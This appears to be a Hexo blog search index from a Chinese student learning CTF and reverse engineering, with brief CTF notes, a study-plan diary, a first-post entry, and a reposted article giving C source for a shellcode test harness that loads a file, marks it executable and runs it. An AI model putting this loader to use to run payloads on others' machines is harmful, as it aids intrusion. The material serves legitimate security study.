jnb:大于或等于则跳转(Jump not below)</p><p><a href="https://www.jianshu.com/p/dc3f6437c108">运用Z来使得程序按照自己想法执行</a></p><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190830134741936.png" class="" title="image-20190830134741936"><hr><h3 id="大小端！！！！！！"><a href="#大小端！！！！！！" class="headerlink" title="大小端！！！！！！"></a>大小端！！！！！！</h3><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190822204713754.png" class="" title="image-20190822204713754"><p>mercedes!!!!</p><hr><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190826101318562.png" class="" title="image-20190826101318562"><p>搜索字符串</p><img src="/2019/11/29/19920%E7%AC%94%E8%AE%B0/image-20190826101343642.png" class="" title="image-20190826101343642"><p>双击flag可找到使用地址</p><p>继续双击DATA XREF后面的信息可跳转到命令起始地址</p><hr><p>链表<a href="https://www.jianshu.com/p/7779f3e83384">https://www.jianshu.com/p/7779f3e83384</a></p><p><a href="https://www.cnblogs.com/ha2ha2/p/7943339.html">https://www.cnblogs.com/ha2ha2/p/7943339.html</a></p><hr><p>ext3</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">mount filename <span class="hljs-regexp">/mnt/</span><br>cd <span class="hljs-regexp">/mnt/</span><br><span class="hljs-keyword">find</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;flag&#x27;</span><br></code></pre></td></tr></table></figure><hr><p>kali</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pdftotext</span> filename.pdf <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><hr><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>用chrome打开pdf 复制所有字符 A.B-</p><p>逐帧查看，或者使用stegslove</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>What a day</title>
    <link href="/2019/11/19/What%20a%20day/"/>
    <url>/2019/11/19/What%20a%20day/</url>
    
    <content type="html"><![CDATA[<p>明明说要调整作息的，结果头疼晚上睡了会，现在一点都不困了。。。。</p><h2 id="想学逆向"><a href="#想学逆向" class="headerlink" title="想学逆向"></a>想学逆向</h2><p>发现了mac上的一些软件之类的，<a href="https://www.jianshu.com/p/c04ac36c6641?tdsourcetag=s_pctim_aiomsg">link</a></p><p>入门<a href="https://blog.csdn.net/qq_21508727/article/details/80559270">link</a></p><p>pwn学习流程<br>– [ ] 小甲鱼视频<br>– [ ] liveoverflow那一套视频入门<br>– [ ] Ctfwiki，每种类型例题跟着做一遍，realworld就漏洞战争，google project zero博客之类的<br>– [ ] 栈简单汇编就行，堆要去看linux源码,Malloc和free部分,常见的dlmalloc和ptmalloc,还有fastbins，glibc2.26之后是trachebins，所以还要看不同版本的源码</p><h2 id="在线ctf平台"><a href="#在线ctf平台" class="headerlink" title="在线ctf平台"></a>在线ctf平台</h2><p><a href="https://i.loli.net/2019/08/06/Jht7r9DY4xadcQZ.png">![ctf平台](What a day/Jht7r9DY4xadcQZ.png)</a></p><p>下那么多游戏就为了一起玩嘛。。。这样吧，等战雷会员过期了就删了吧。嗯</p><h1 id="GOGOGO！"><a href="#GOGOGO！" class="headerlink" title="GOGOGO！"></a>GOGOGO！</h1><h1 id="过几天重新开始一大早起床跑步吧"><a href="#过几天重新开始一大早起床跑步吧" class="headerlink" title="过几天重新开始一大早起床跑步吧!"></a>过几天重新开始一大早起床跑步吧!</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>转载-编写shellcode测试工具</title>
    <link href="/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    <url>/2019/11/19/%E7%BC%96%E5%86%99shellcode%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>不知不觉，shellcode已成功攻击过程中必不可少的步骤，后面的文章会继续介绍如何编写其它类型的shellcode。直到目前为止，每次完shellcode汇编代码，都需要找到之前（或者重新编写）带缓冲区溢出漏洞的代码进行测试，同时要不停地对准EIP以及esp地址。这对于测试shellcode的正确性来说，很不方便，也难以调试。为此，我们先编写shellcode测试工具，方便后面测试shellcode，所谓磨刀不误砍柴功。</p><p>shellcode测试工具sctest<br>我们将工具取名为sctest，是shell code test的缩写。<br>命令用法：sctest  &lt;shellcode二进制文件&gt;</p><p>该程序的实现很简单：</p><p>1） 读shellcode 二进制读到内存<br>2）将装载shellcode内存的属性变成可执行<br>3）跳到该shellcode执行</p><p>代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-keyword">char</span> code[<span class="hljs-number">4096</span>] __attribute__((aligned(<span class="hljs-number">4096</span>)));<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-keyword">void</span> (*func)(<span class="hljs-keyword">void</span>);<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;\n\tUsage: sctest &lt;shellcode&gt;\n\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br> <br>fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br><span class="hljs-keyword">if</span> (!fd) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unable open file %s, err = %d(%m)\n&quot;</span>, argv[<span class="hljs-number">1</span>], errno);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>&#125;<br> <br>ret = read(fd, code, <span class="hljs-keyword">sizeof</span>(code));<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unable read file %s, err = %d(%m)\n&quot;</span>, argv[<span class="hljs-number">1</span>], errno);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br>&#125;<br> <br>ret = mprotect(code, <span class="hljs-keyword">sizeof</span>(code), PROT_EXEC);<br><span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unable mprotect, err = %d(%m)\n&quot;</span>, errno);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br>&#125;<br> <br><span class="hljs-comment">/* execute shell code */</span><br>func = (<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))code;<br>func();<br><span class="hljs-built_in">abort</span>();  <br>&#125;<br></code></pre></td></tr></table></figure><p>编译<br>到目前为止，shellcode的运行环境都是32位应用程序，以后涉及64位应用程序；由于同一程序不能混搭32和64位指令，因此需要编译两个工具（32位和64位）</p><p>$ gcc -Wall -g -o sctest32 sctest.c -m32<br>$ gcc -Wall -g -o sctest sctest.c</p><p>测试以前的shellcode</p><p>上篇文章中，介绍如何编写本地shellcode，使用sctest32工具对它进行测试：</p><p>当前 bash的pid</p><p>$ echo $$<br>2180</p><p>测试shellcode<br>ivan@ivan:~/exploit/tools$ ./sctest32 ../shell2</p><p>运行shellcode后sh的pid<br>$ echo $$<br>3178</p><p>两个pid不一样，说明 shell2成功启动了一个新sh</p><p>在后面的shellcode介绍中，我们会使用sctest32/sctest工具进行独立测试，不依赖于漏洞代码。</p><hr><p>版权声明：本文为CSDN博主「海枫」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/linyt/article/details/43538837">https://blog.csdn.net/linyt/article/details/43538837</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World!</title>
    <link href="/2019/11/19/hello-world/"/>
    <url>/2019/11/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>2019/8/3日 15：22，我的网站算是正式开通了。这里可能是我展现最真实的我的地方，也用来记录我的学习过程和学习资料。在此先感谢一下毛同学的大力鼓吹，让我搞了这个，也感谢我的学校给我报销（笑</p><p>最近在学校的大数据班学习了在centOS搭建hadoop平台（使用java进行程序编写），最开始的是计算和管理都在一个模拟机里的伪分布式，一主一仆的也在回家后在自家电脑上完成了搭建。</p><p>后来为了搞github和gitee备份代码，又去研究了git如何使用，以及在vscode里同步代码，现在也是可以啦~点这可以看 相关代码和操作</p><p>为了在学校更好的敲代码（装逼），也是打算买一个豆子峡谷，装上黑苹果和centOS，平时用黑苹果和我的surface，计算时就用centOS。不得不说i58259U这东西好像挺强的，2/3个8700k，对比i7 8559u差距也不大。</p><p>今天也开始了DVWA的学习，学习使用kali，（虽然今早也没搞多少。。好像就搞了个Brup Force，连Brup Suite的爆破也没完全弄懂咋搞。。</p><p>就先这样吧。还有很多很多没搞懂，但最首先的先享受一下我最后的十来天暑假吧!</p><p>更新：11/19 使用hexo并部署到了github上，打算使用自己的云服务器做加速= =</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
